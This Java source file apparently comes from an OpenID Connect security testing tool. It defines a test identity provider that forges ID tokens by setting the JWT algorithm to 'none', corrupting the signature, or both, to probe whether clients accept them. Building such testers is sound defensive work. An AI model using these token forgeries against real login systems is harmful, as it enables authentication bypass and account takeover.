/****************************************************************************
 * Copyright 2016 Ruhr-Universität Bochum.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 ***************************************************************************/

package de.rub.nds.oidc.server.op;

import com.nimbusds.jose.JOSEException;
import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.JWSHeader;
import com.nimbusds.jose.util.Base64URL;
import com.nimbusds.jwt.JWT;
import com.nimbusds.jwt.PlainJWT;
import com.nimbusds.jwt.SignedJWT;
import com.nimbusds.oauth2.sdk.ParseException;
import com.nimbusds.oauth2.sdk.id.ClientID;
import com.nimbusds.openid.connect.sdk.Nonce;
import com.nimbusds.openid.connect.sdk.claims.AccessTokenHash;
import com.nimbusds.openid.connect.sdk.claims.CodeHash;
import java.security.GeneralSecurityException;
import net.minidev.json.JSONObject;

/**
 *
 * @author Tobias Wich
 */
public class SignatureManipulationOP extends DefaultOP {

	@Override
	protected JWT getIdToken(ClientID clientId, Nonce nonce, AccessTokenHash atHash, CodeHash cHash)
			throws GeneralSecurityException, JOSEException, ParseException {
		JWT jwt = super.getIdToken(clientId, nonce, atHash, cHash);
		SignedJWT origJwt = (SignedJWT) jwt;

		boolean sigInvalid = params.getBool(OPParameterConstants.FORCE_TOKEN_SIG_INVALID);
		boolean sigNone = params.getBool(OPParameterConstants.FORCE_TOKEN_SIG_NONE);

		try {
			if (sigInvalid && sigNone) {
				JSONObject newHdr = origJwt.getHeader().toJSONObject();
				newHdr.put("alg", "none");
				Base64URL newHdr64 = Base64URL.encode(newHdr.toString());

				byte[] newSig = origJwt.getSignature().decode();
				newSig[0] = (byte) (newSig[0] ^ 0xFF); // flip bits in first byte
				Base64URL newSig64 = Base64URL.encode(newSig);

				Base64URL newPayload = origJwt.getPayload().toBase64URL();

				//SignedJWT newJwt = new SignedJWT(newHdr64, newPayload, newSig64);
				JWT newJwt = new UnsafeJWT(newHdr64, newPayload, newSig64);
				return newJwt;
			} else if (sigInvalid) {
				Base64URL newHdr64 = origJwt.getHeader().toBase64URL();

				byte[] newSig = origJwt.getSignature().decode();
				newSig[0] = (byte) (newSig[0] ^ 0xFF); // flip bits in first byte
				Base64URL newSig64 = Base64URL.encode(newSig);

				Base64URL newPayload = origJwt.getPayload().toBase64URL();

				SignedJWT newJwt = new SignedJWT(newHdr64, newPayload, newSig64);
				return newJwt;
			} else if (sigNone) {
				JSONObject newHdr = origJwt.getHeader().toJSONObject();
				newHdr.put("alg", "none");
				Base64URL newHdr64 = Base64URL.encode(newHdr.toString());

				Base64URL newPayload = origJwt.getPayload().toBase64URL();

				JWT newJwt = new UnsafeJWT(newHdr64, newPayload);
				return newJwt;
			} else {
				return jwt;
			}
		} catch (java.text.ParseException ex) {
			throw new ParseException(ex.getMessage(), ex);
		}
	}

	protected static JWSHeader copyJwsHeader(JWSAlgorithm newAlg, JWSHeader oldHeader) {
		return new JWSHeader.Builder(newAlg)
				.contentType(oldHeader.getContentType())
				.criticalParams(oldHeader.getCriticalParams())
				.customParams(oldHeader.getCustomParams())
				.jwk(oldHeader.getJWK())
				.jwkURL(oldHeader.getJWKURL())
				.keyID(oldHeader.getKeyID())
				.type(oldHeader.getType())
				.x509CertChain(oldHeader.getX509CertChain())
				.x509CertSHA256Thumbprint(oldHeader.getX509CertSHA256Thumbprint())
				.x509CertThumbprint(oldHeader.getX509CertThumbprint())
				.x509CertURL(oldHeader.getX509CertURL())
				.build();
	}

}
